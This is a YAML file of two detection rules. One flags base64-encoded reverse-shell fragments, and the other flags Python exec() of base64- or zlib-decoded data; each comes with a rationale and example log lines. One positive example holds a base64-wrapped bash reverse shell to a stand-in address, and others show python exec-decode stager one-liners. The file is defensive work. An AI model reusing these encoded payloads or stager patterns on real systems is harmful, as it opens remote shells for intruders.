- id: mention.encoded.reverse_shell_base64
  title: Base64 of reverse-shell strings at any byte alignment
  match:
    literal:
      - 'L2Jpbi9iYXNoIC1p'
      - '9iaW4vYmFzaCAta'
      - 'vYmluL2Jhc2ggLW'
      - 'L2Rldi90Y3Av'
      - '9kZXYvdGNwL'
      - 'vZGV2L3RjcC'
      - 'YmFzaCAtaSA+J'
      - 'Jhc2ggLWkgPi'
      - 'iYXNoIC1pID4m'
      - 'L2Jpbi9zaCAta'
      - '9iaW4vc2ggLW'
      - 'vYmluL3NoIC1p'
  case_sensitive: true
  strength: strong
  attack: [T1027.010, T1059.004]
  telemetry: [any]
  source:
    name: Sigma specification, base64offset modifier, applied to reverse-shell strings from the revshells.com catalog
    url: https://sigmahq.io/sigma-specification/specification/sigma-modifiers-appendix.html
    license: 'not applicable: method reference; the encoded strings are computed from public reverse-shell text'
    upstream_id: null
  rationale: >-
    '/bin/bash -i', '/bin/sh -i', '/dev/tcp/' and 'bash -i >&' encoded at each of the three byte alignments, using
    the base64offset construction (encode with 0, 1 or 2 leading bytes, drop the characters those bytes and the
    trailing partial group affect). These are the interactive-shell and bash-socket cores of reverse shells hidden in
    base64 (echo ... | base64 -d | bash, Java deserialization payloads). Benign base64 scripts rarely contain an
    interactive '-i' shell or /dev/tcp; random base64 data contains an 11+ character fragment by chance with
    negligible probability.
  examples:
    positive:
      - 'Nov 20 12:09:00 web01 java[2001]: payload=bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuNy80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
    negative:
      - 'Nov 20 12:09:01 web01 cloud-init[612]: user-data: IyEvYmluL2Jhc2gKYXB0LWdldCB1cGRhdGUK'
      - 'Nov 20 12:09:02 web01 app[700]: blob=L2V0Yy9ob3N0cw=='

- id: mention.encoded.python_exec_decode
  title: Python exec of base64 or zlib decoded content
  match:
    anchored: 'exec\( {0,2}(?:(?:__import__\(["'']base64["'']\)\.|base64\.)?b64decode|__import__\(["'']zlib["'']\)\.decompress|zlib\.decompress)\('
  case_sensitive: true
  strength: strong
  attack: [T1059.006, T1140, T1027.010]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Python One-Liners with Base64 Decoding - Linux (Hugh Ryan, Swachchhanda Shrawan Poudel)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_python_base64_encoded_execution.yml
    license: DRL-1.1
    upstream_id: 55e862a8-dd9c-4651-807a-f21fcad56716
  rationale: >-
    Narrows the rule (import, base64 and a decode call in a python -c line) to the case where the decoded bytes are
    executed directly. exec() of decoded data is the Python stager shape (Empire, Pupy, Metasploit python payloads);
    data-processing code decodes but does not exec.
  examples:
    positive:
      - 'Nov 20 12:10:00 web01 bash[708]: HISTORY: python3 -c "import base64;exec(base64.b64decode(''aW1wb3J0IHNvY2tldA==''))"'
      - 'Nov 20 12:10:01 web01 bash[709]: HISTORY: python -c "exec(__import__(''zlib'').decompress(__import__(''base64'').b64decode(''eJx'')))"'
    negative:
      - 'Nov 20 12:10:02 web01 app[700]: data = base64.b64decode(payload["image"])'
      - 'Nov 20 12:10:03 web01 bash[710]: HISTORY: python3 -c "import base64; print(base64.b64decode(''aGk=''))"'
